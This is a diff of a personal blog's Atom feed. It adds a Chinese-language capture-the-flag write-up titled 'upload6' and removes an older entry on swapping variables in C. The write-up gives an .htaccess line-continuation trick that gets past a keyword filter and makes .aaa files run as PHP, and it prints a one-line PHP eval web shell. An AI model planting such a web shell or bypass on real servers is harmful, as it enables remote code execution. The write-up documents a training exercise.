@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://crlrlc.github.io/</id>
     <title>Gridea</title>
-    <updated>2020-10-28T11:24:49.400Z</updated>
+    <updated>2020-10-29T09:38:23.048Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://crlrlc.github.io/"/>
     <link rel="self" href="https://crlrlc.github.io/atom.xml"/>
@@ -10,6 +10,50 @@
     <logo>https://crlrlc.github.io/images/avatar.png</logo>
     <icon>https://crlrlc.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, Gridea</rights>
+    <entry>
+        <title type="html"><![CDATA[3,upload6]]></title>
+        <id>https://crlrlc.github.io/post/3upload6/</id>
+        <link href="https://crlrlc.github.io/post/3upload6/">
+        </link>
+        <updated>2020-10-29T09:30:36.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="htaccess文件换行绕过">.htaccess文件换行绕过</h3>
+<p>上传.htaccess文件时候发现文件内容被过滤。可以使用换行绕过的方法绕过过滤。</p>
+<p>.htaccess支持换行编写所以使用换行可以直接上传成功并解析。</p>
+<ul>
+<li>题目</li>
+</ul>
+<p>upload6</p>
+<ul>
+<li>
+<p>过滤掉application，则使用换行绕过</p>
+</li>
+<li>
+<p>.htaccess</p>
+</li>
+</ul>
+<pre><code>AddType application/x-httpd-php .aaa
+</code></pre>
+<p>提示：内容不能有application</p>
+<p>尝试使用.htaccess文件换行绕过。</p>
+<ul>
+<li>.htaccess</li>
+</ul>
+<pre><code>AddType appli\
+cation/x-httpd-php .aaa
+</code></pre>
+<ul>
+<li>1.aaa</li>
+</ul>
+<pre><code>&lt;?php
+@eval($_POST['cmd']);
+</code></pre>
+<p>##步骤如下：<br>
+<img src="https://crlrlc.github.io//post-images/1603964256264.png" alt="" loading="lazy"><br>
+<img src="https://crlrlc.github.io//post-images/1603964263023.png" alt="" loading="lazy"><br>
+<img src="https://crlrlc.github.io//post-images/1603964269523.png" alt="" loading="lazy"><br>
+<img src="https://crlrlc.github.io//post-images/1603964275363.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[第二次打靶]]></title>
         <id>https://crlrlc.github.io/post/di-er-ci-da-ba/</id>
@@ -366,39 +410,6 @@ return 0;
 赋值运算符：= += *= /=（请勿中间加空格）
 优先级别：算数》关系》》逻辑》赋值
 */</code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[第二篇：值的互换]]></title>
-        <id>https://crlrlc.github.io/post/di-er-pian-zhi-de-hu-huan/</id>
-        <link href="https://crlrlc.github.io/post/di-er-pian-zhi-de-hu-huan/">
-        </link>
-        <updated>2020-10-13T00:03:21.000Z</updated>
-        <content type="html"><![CDATA[<p>源码:<br>
-1)/*<br>
-目的：搞会变量的互换<br>
-<em>/<br>
-#include&lt;stdio.h&gt;<br>
-int main(void)<br>
-{<br>
-int i = 4;<br>
-int j = 5;<br>
-/</em><br>
-i = j;<br>
-j = i;不能将j与i进行互换，正确的做法是引用3个：i，j，k<br>
-<em>/<br>
-int k;<br>
-k = i;<br>
-i = j;<br>
-j = k;<br>
-printf(&quot;i = %d; j = %d; k = %d&quot;, i, j, k);<br>
-return 0;<br>
-}<br>
-/</em><br>
-最终结果i=5，j=4，k=4<br>
-*/<br>
-##挂个图<br>
-<img src="https://crlrlc.github.io//post-images/1603884283299.png" alt="" loading="lazy"></p>
 ]]></content>
     </entry>
 </feed>
